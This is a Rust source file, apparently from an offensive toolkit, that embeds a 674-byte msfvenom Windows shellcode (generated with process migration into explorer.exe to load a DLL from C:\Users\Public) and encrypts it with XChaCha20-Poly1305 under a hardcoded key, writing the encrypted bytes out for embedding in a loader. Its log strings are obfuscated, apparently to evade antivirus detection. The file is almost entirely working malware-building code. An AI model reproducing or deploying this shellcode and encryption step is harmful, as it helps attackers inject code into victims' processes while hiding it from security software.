mod encrpt;
use encrpt::{FileEncryptor, XChaCha20Poly1305Encryptor};
use tracing::{metadata::LevelFilter, info, error, warn};


//msfvenom -p windows/x64/loadlibrary DLL=C:\\Users\\Public\\in.dll PrependMigrate=true PrependMigrateProc=explorer.exe -f rust ‐-bad-chars '\x00\x0a\x0d'
const BUF: [u8; 674] = [0xfc,0xe8,0xc1,0x00,0x00,0x00,0x41,
0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
0x48,0x85,0xc0,0x74,0x68,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x67,0xe3,0x56,0x48,0xff,
0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,
0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,
0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd7,
0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,
0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,
0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,
0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,
0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x56,0xff,0xff,0xff,
0x5d,0x48,0x81,0xc4,0x70,0xfe,0xff,0xff,0x48,0x8d,0x4c,0x24,
0x30,0x41,0xba,0xb1,0x4a,0x6b,0xb1,0xff,0xd5,0xe9,0x8a,0x00,
0x00,0x00,0x5e,0x6a,0x00,0x48,0x8d,0xbc,0x24,0x20,0x01,0x00,
0x00,0x57,0x48,0x8d,0x4c,0x24,0x60,0x51,0x48,0x31,0xc9,0x51,
0x51,0x68,0x04,0x00,0x00,0x08,0x51,0x49,0x89,0xc9,0x49,0x89,
0xc8,0x48,0x89,0xf2,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
0x48,0x85,0xc0,0x0f,0x84,0x6a,0x00,0x00,0x00,0x6a,0x40,0x49,
0xc7,0xc1,0x00,0x10,0x00,0x00,0x4d,0x89,0xc8,0x48,0x31,0xd2,
0x48,0x8b,0x0f,0x41,0xba,0xae,0x87,0x92,0x3f,0xff,0xd5,0x48,
0x89,0xc3,0x54,0x49,0xc7,0xc1,0x20,0x01,0x00,0x00,0xeb,0x3e,
0x41,0x58,0x48,0x89,0xc2,0x48,0x8b,0x0f,0x41,0xba,0xc5,0xd8,
0xbd,0xe7,0xff,0xd5,0x48,0x31,0xc9,0x51,0x51,0x51,0x49,0x89,
0xd9,0x49,0x89,0xc8,0x48,0x8b,0x0f,0x41,0xba,0xc6,0xac,0x9a,
0x79,0xff,0xd5,0xe9,0xf9,0x00,0x00,0x00,0xe8,0x71,0xff,0xff,
0xff,0x65,0x78,0x70,0x6c,0x6f,0x72,0x65,0x72,0x2e,0x65,0x78,
0x65,0x00,0xe8,0xbd,0xff,0xff,0xff,0xfc,0x48,0x83,0xe4,0xf0,
0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
0x66,0x81,0x78,0x18,0x0b,0x02,0x75,0x72,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,
0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,
0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,
0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4f,0xff,0xff,
0xff,0x5d,0x48,0x8d,0x8d,0xff,0x00,0x00,0x00,0x41,0xba,0x4c,
0x77,0x26,0x07,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,0x55,
0x73,0x65,0x72,0x73,0x5c,0x50,0x75,0x62,0x6c,0x69,0x63,0x5c,
0x69,0x6e,0x2e,0x64,0x6c,0x6c,0x00];


fn main() {
    let args: Vec<String> = std::env::args().collect();

    tracing_subscriber::fmt().with_max_level(LevelFilter::DEBUG).init();


    if args.len() < 2{
        error!("{}", obfstr::obfstr!("You should give one argument."));
        error!("{}", obfstr::obfstr!("Example: .\\encrypt_shellcode.exe shellcode.bin"));
        return;
    }

    if args.len() > 2{
        warn!("{}", obfstr::obfstr!("You should give one argument."));
        warn!("We are going to use just first and second argument: {}", &args[1]);
    }

    let legit_dlls_path: &String = &args[1].to_string();

    info!("{}", obfstr::obfstr!("Encryption Is Starting..."));

    // Define a 32-byte (256-bit) constant key.
    let large_file_key = [0x6a, 0x72, 0x65, 0x6d, 0x20, 0x69, 0x75, 0x73, 0x75, 0x6d, 0x20, 0x64, 0x6f, 0x6c, 0x6f, 0x72, 0x20, 0x72, 0x69, 0x74, 0x20, 0x61, 0x6d, 0x65, 0x74, 0x2c, 0x20, 0x63, 0x6c, 0x6e, 0x73, 0x35];

    // Define a 19-byte (152-bit) constant nonce value.
    let large_file_nonce = [0x49, 0x76, 0x61, 0x6e, 0x20, 0x42, 0x61, 0x63, 0x61, 0x6b, 0x31, 0x49, 0x6e, 0x63, 0x65, 0x6c, 0x69, 0x6b, 0x40];

    let encode = XChaCha20Poly1305Encryptor {
        key: &large_file_key,
        nonce: &large_file_nonce,
    };
    
    let shellcode = match encode.encrypt_data(BUF.to_vec()){
        std::result::Result::Ok(e) => {info!("{}", obfstr::obfstr!("Encryption Is Done..."));e},
        Err(e) => {error!("Can't encrypt shellcode. Error: {}", e);return;},
    };

    let mut hex = String::new();
    hex.push_str("[");
    for (i, byte) in shellcode.iter().enumerate() {
        hex.push_str(format!("{:#04X}", byte).as_str());
        
        if i < shellcode.len() - 1 {
            hex.push_str(", ");
        }
    }
    hex.push_str("];");

    info!("const BUF: [u8; {}] = {}", shellcode.len(), hex);
    
    match std::fs::write(legit_dlls_path, hex){
        Ok(_e) => info!("Shellcode writed to {} file.", legit_dlls_path),
        Err(_e) => error!("Error, can't write shellcode to .txt file.")
    };
}
